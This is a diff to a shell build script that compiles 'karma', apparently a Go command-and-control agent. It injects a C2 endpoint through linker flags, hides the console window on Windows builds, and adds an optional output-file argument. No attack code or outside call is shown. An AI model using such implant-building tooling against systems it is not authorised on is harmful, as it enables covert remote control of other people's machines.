@@ -12,6 +12,7 @@ X1=$8
 X2=$9
 UUID=${10}
 PACKER=${11}
+OUTFILE=${12}
 
 LDFLAGS=(
     "-X 'main.InitC2Endpoint=${C2}'"
@@ -30,8 +31,18 @@ if [ "${GOOS}" == "windows" ]; then
     LDFLAGS+=("-H=windowsgui")
 fi
 
+if [ ! -z "$OUTFILE" ]; then
+    LOCATION=$OUTFILE
+    OUTFILE="-o ${OUTFILE}"
+fi
+
 cd $(dirname $0)
-GOOS=${GOOS} GOARCH=${GOARCH} go build -ldflags="${LDFLAGS[*]}" .
-mkdir -p $OLDDIR/bin
-mv karma* $OLDDIR/bin
-echo "'karma' saved to $OLDDIR/bin"
+GOOS=${GOOS} GOARCH=${GOARCH} go build -ldflags="${LDFLAGS[*]}" ${OUTFILE}
+
+
+if [ -z "$OUTFILE" ]; then
+    LOCATION=$OLDDIR/bin
+    mkdir -p $LOCATION
+    mv karma* $LOCATION
+fi
+echo "'karma' instance saved at $LOCATION"
